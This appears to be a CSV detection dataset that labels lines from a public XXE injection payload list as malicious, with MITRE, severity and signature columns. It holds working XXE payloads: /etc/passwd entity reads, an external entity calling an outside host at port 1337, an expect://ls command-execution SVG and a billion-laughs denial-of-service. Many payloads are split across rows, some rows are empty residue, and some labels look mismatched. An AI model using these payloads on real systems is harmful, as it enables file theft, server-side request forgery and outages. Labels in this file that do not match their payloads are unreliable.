Payload,Signature,AttackType,Severity,MITRE,Label,Description
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
<!DOCTYPE foo [  ,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
<!ELEMENT foo (#ANY)>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
* XXE: Blind Local File Inclusion Example (When first case doesn't return anything.),XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
<!DOCTYPE foo [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
<!ELEMENT foo (#ANY)>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
* XXE: Access Control Bypass (Loading Restricted Resources - PHP example),XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
<!DOCTYPE foo [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
<foo><result>&ac;</result></foo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
* XXE:SSRF ( Server Side Request Forgery ) Example,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
<!DOCTYPE foo [  ,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
<!ELEMENT foo (#ANY)>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
*  XXE: (Remote Attack - Through External Xml Inclusion) Exmaple,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
<!DOCTYPE lolz [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
"<!ENTITY test SYSTEM ""https://example.com/entity1.xml"">]>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
<lolz><lol>3..2..1...&test<lol></lolz>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
* XXE: UTF-7 Exmaple,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
"<?xml version=""1.0"" encoding=""UTF-7""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
* XXE: Base64 Encoded,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
* XXE: XXE inside SOAP Example,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
<soap:Body>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
  <foo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
  </foo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
</soap:Body>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
* XXE: XXE inside SVG,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
"<svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" width=""300"" version=""1.1"" height=""200"">",CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
"    <image xlink:href=""expect://ls""></image>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
</svg>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (master branch)
"<!--?xml version=""1.0"" ?-->",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<userInfo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<firstName>John</firstName>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<lastName>Doe</lastName>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
</userInfo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!--?xml version=""1.0"" ?-->",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!DOCTYPE replace [<!ENTITY example ""Doe""> ]>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<userInfo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<firstName>John</firstName>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<lastName>&example;</lastName>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
</userInfo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!--?xml version=""1.0"" ?-->",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<userInfo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<firstName>John</firstName>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<lastName>&ent;</lastName>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
</userInfo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!--?xml version=""1.0"" ?-->",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!DOCTYPE lolz [<!ENTITY lol ""lol""><!ELEMENT lolz (#PCDATA)>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol1 ""&lol;&lol;&lol;&lol;&lol;&lol;&lol;",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol2 ""&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol3 ""&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol4 ""&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol5 ""&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol6 ""&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol7 ""&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol8 ""&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol9 ""&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<tag>&lol9;</tag>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!DOCTYPE foo [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!ELEMENT foo (#ANY)>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!DOCTYPE foo [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!ELEMENT foo (#ANY)>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!DOCTYPE foo [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<foo><result>&ac;</result></foo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!DOCTYPE foo [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!ELEMENT foo (#ANY)>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!DOCTYPE lolz [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY test SYSTEM ""https://example.com/entity1.xml"">]>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<lolz><lol>3..2..1...&test<lol></lolz>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0"" encoding=""UTF-7""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<soap:Body>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<foo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
</foo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
</soap:Body>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" width=""300"" version=""1.1"" height=""200"">",CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<image xlink:href=""expect://ls""></image>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
</svg>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
" """,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
" """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
" """,XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
" """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
" """,XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
# XML External Entity (XXE) Injection Payloads,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
* XXE : Classic XXE,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!DOCTYPE data [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!ELEMENT data (#ANY)>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
]>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<data>&file;</data>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
  <!DOCTYPE foo [  ,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
  <!ELEMENT foo ANY >,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!DOCTYPE foo [  ,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
  <!ELEMENT foo ANY >,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!DOCTYPE foo [  ,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
  <!ELEMENT foo ANY >,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
* XXE: Basic XML Example,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!--?xml version=""1.0"" ?-->",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<userInfo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
 <firstName>John</firstName>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
 <lastName>Doe</lastName>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
</userInfo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
*  XXE: Entity Example,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!--?xml version=""1.0"" ?-->",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!DOCTYPE replace [<!ENTITY example ""Doe""> ]>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
 <userInfo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
  <firstName>John</firstName>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
  <lastName>&example;</lastName>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
 </userInfo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
*  XXE: File Disclosure,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!--?xml version=""1.0"" ?-->",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<userInfo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
 <firstName>John</firstName>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
 <lastName>&ent;</lastName>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
</userInfo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
* XXE: Denial-of-Service Example,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!--?xml version=""1.0"" ?-->",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
